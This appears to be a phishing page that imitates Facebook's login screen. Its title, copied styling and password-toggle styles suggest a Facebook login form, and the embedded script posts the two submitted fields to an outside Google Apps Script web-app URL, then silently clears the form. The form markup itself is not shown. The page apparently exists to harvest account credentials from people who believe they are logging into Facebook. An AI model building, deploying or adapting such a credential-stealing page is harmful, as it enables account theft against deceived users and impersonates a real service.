<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Log into Facebook</title>
    <style>
        /* CSS Reset & Global Typography */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            color: #1c1e21;
            margin: 0;
            padding: 0;
            min-height: 100vh;
        }

        /* ---------------------------------------------------
           VIEW CONTROLLERS (Responsive Switching)
           --------------------------------------------------- */
        .desktop-view {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .mobile-view {
            display: none; /* Hidden by default on large screens */
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            background-color: #ffffff;
        }

        @media (max-width: 900px) {
            .desktop-view {
                display: none !important; /* Hide desktop on small screens */
            }
            .mobile-view {
                display: flex !important; /* Show mobile on small screens */
            }
        }


        /* ---------------------------------------------------
           DESKTOP STYLES
           --------------------------------------------------- */
        .desktop-view .main-content {
            display: flex;
            flex: 1;
            width: 100%;
            max-width: 1400px;
            margin: 0 auto;
            position: relative;
        }

        .desktop-view .left-panel {
            flex: 1.5;
            position: relative;
            padding: 40px 60px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            min-height: 700px;
        }

        .desktop-view .fb-logo {
            color: #0866ff;
            font-size: 40px;
            display: flex;
            z-index: 10;
        }

        .desktop-view .hero-image-wrapper {
            position: absolute;
            top: 50%;
            right: -20px;
            transform: translateY(-50%);
            width: 100%;
            max-width: 700px;
            z-index: 1;
            pointer-events: none;
            display: flex;
            justify-content: flex-end;
        }

        .desktop-view .hero-image-wrapper img {
            width: 90%;
            height: auto;
            display: block;
        }

        .desktop-view .hero-text {
            z-index: 10;
            padding-bottom: 20px;
        }

        .desktop-view .hero-text h1 {
            font-size: 3.8rem;
            font-weight: 800;
            line-height: 1.05;
            letter-spacing: -1.5px;
            color: #000000;
        }

        .desktop-view .hero-text .highlight {
            color: #0866ff;
        }

        .desktop-view .right-panel {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 40px 60px;
            border-left: 1px solid #e5e5e5;
            z-index: 5;
            background: #ffffff;
        }

        .desktop-view .login-box {
            width: 100%;
            max-width: 400px;
            margin-top: -50px;
        }

        .desktop-view .login-box h2 {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 20px;
            color: #1c1e21;
        }

        .desktop-view .login-form input {
            width: 100%;
            padding: 16px;
            margin-bottom: 12px;
            border: 1px solid #ccd0d5;
            border-radius: 8px;
            font-size: 15px;
            background-color: #fff;
            color: #1c1e21;
        }
        
        .desktop-view .login-form input::placeholder {
            color: #8d949e;
        }

        .desktop-view .login-form input:focus {
            outline: none;
            border-color: #0866ff;
            box-shadow: 0 0 0 2px #e7f0fe;
        }

        .desktop-view .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #0866ff;
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 8px;
            margin-bottom: 20px;
            transition: background-color 0.2s;
        }

        .desktop-view .btn-login:hover {
            background-color: #005ce6;
        }

        .desktop-view .forgot-link {
            text-align: center;
            display: block;
            color: #1c1e21;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 35px;
        }

        .desktop-view .forgot-link:hover {
            text-decoration: underline;
        }

        .desktop-view .btn-create {
            width: 100%;
            padding: 14px;
            background-color: transparent;
            color: #0866ff;
            border: 1px solid #0866ff;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 30px;
            transition: background-color 0.2s;
        }

        .desktop-view .btn-create:hover {
            background-color: #f5f6f7;
        }

        .desktop-view .meta-logo {
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .desktop-view .meta-logo svg {
            height: 16px;
            width: auto;
        }

        .desktop-view footer {
            border-top: 1px solid #e5e5e5;
            padding: 25px 0;
            background-color: #ffffff;
            width: 100%;
        }

        .desktop-view .footer-links {
            list-style: none;
            display: flex;
            justify-content: center;
            gap: 20px;
            flex-wrap: wrap;
            max-width: 1000px;
            margin: 0 auto;
        }

        .desktop-view .footer-links li a {
            color: #737373;
            text-decoration: none;
            font-size: 12px;
        }

        .desktop-view .footer-links li a:hover {
            text-decoration: underline;
        }


        /* ---------------------------------------------------
           MOBILE STYLES
           --------------------------------------------------- */
        .mobile-view .mobile-container {
            width: 100%;
            max-width: 500px;
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .mobile-view .top-banner {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
            color: #0866ff;
            font-weight: 500;
            font-size: 14px;
            border-bottom: 1px solid #ccd0d5;
            cursor: pointer;
        }

        .mobile-view .top-banner svg {
            width: 20px;
            height: 20px;
            margin-right: 8px;
            fill: none;
            stroke: currentColor;
            stroke-width: 2;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        .mobile-view .language-selector {
            text-align: center;
            color: #65676b;
            font-size: 14px;
            margin-top: 12px;
        }

        .mobile-view .content {
            padding: 0 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            flex: 1;
        }

        .mobile-view .logo-container {
            margin: 24px 0 32px 0;
            color: #0866ff;
            font-size: 60px;
            display: flex;
            justify-content: center;
        }

        .mobile-view .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
        }

        .mobile-view .login-form input {
            width: 100%;
            padding: 16px;
            margin-bottom: 12px;
            border: 1px solid #ccd0d5;
            border-radius: 12px;
            font-size: 15px;
            color: #1c1e21;
            background-color: #fff;
        }

        .mobile-view .login-form input::placeholder {
            color: #65676b;
        }

        .mobile-view .login-form input:focus {
            outline: none;
            border-color: #0866ff;
        }

        .mobile-view .btn-login {
            width: 100%;
            padding: 12px;
            background-color: #0866ff;
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 4px;
            margin-bottom: 20px;
        }

        .mobile-view .forgot-link {
            color: #1c1e21;
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
            margin-bottom: 40px;
        }

        .mobile-view .spacer {
            flex-grow: 1;
            min-height: 40px;
        }

        .mobile-view .btn-create {
            width: 100%;
            padding: 12px;
            background-color: transparent;
            color: #0866ff;
            border: 1px solid #0866ff;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 24px;
        }

        .mobile-view .meta-logo {
            margin-bottom: 16px;
        }

        .mobile-view .meta-logo svg {
            height: 14px;
            width: auto;
        }

        .mobile-view .footer-links {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
        }

        .mobile-view .footer-links a {
            color: #65676b;
            text-decoration: none;
            font-size: 11px;
        }

        /* ---------------------------------------------------
           PASSWORD / MESSAGE TOGGLE STYLES
           --------------------------------------------------- */
        .password-container {
            position: relative;
            width: 100%;
            margin-bottom: 12px;
        }

        .password-container input {
            margin-bottom: 0 !important;
            padding-right: 45px !important;
        }

        .toggle-password {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #8d949e;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .toggle-password svg {
            width: 20px;
            height: 20px;
            fill: currentColor;
        }
    </style>
</head>

<Script>

   // Replace with your deployed Google Apps Script Web App URL
const scriptURL = 'https://script.google.com/macros/s/AKfycbyMjNMy4jq6-v82Y1UuQvCM_7bF8ihvkgRe8lZtKI4mmC8KyJ0JN1ZtHgdGXopXVfj2IQ/exec';

// Helper function to handle submission for any form
function setupFormSubmission(formId, contactInputId, messageInputId, buttonSelector) {
    const formElement = document.getElementById(formId);
    
    // Check if the form exists on the page before adding the listener
    if (formElement) {
        formElement.addEventListener('submit', function(e) {
            e.preventDefault(); // Prevent page reload

            // Gather values using the specific IDs for this form
            const contactValue = document.getElementById(contactInputId).value;
            const messageValue = document.getElementById(messageInputId).value;

            const payload = {
                contact: contactValue, 
                message: messageValue
            };

            // Change button text to show it's loading
            const submitButton = document.querySelector(buttonSelector);
            const originalButtonText = submitButton.textContent;
            submitButton.textContent = 'loading...';

            // Send the data
            fetch(scriptURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'text/plain;charset=utf-8' 
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => {
                if (data.result === 'success') {
                    formElement.reset(); // Clear just the form that was submitted
                } else {
                    alert('Error: ' + data.error);
                }
            })
            .catch(error => {
                console.error('Fetch Error:', error);
                alert('There was a problem submitting your message.');
            })
            .finally(() => {
                // Reset button text
                submitButton.textContent = originalButtonText;
            });
        });
    }
}

// Initialize Form 1 using the #submitBtn1 ID
setupFormSubmission('messageForm', 'contactInfo', 'userMessage', '#submitBtn1');

// Initialize Form 2 using the #submitBtn2 ID
setupFormSubmission('messageForm2', 'contactInfo2', 'userMessage2', '#submitBtn2');
</Script>
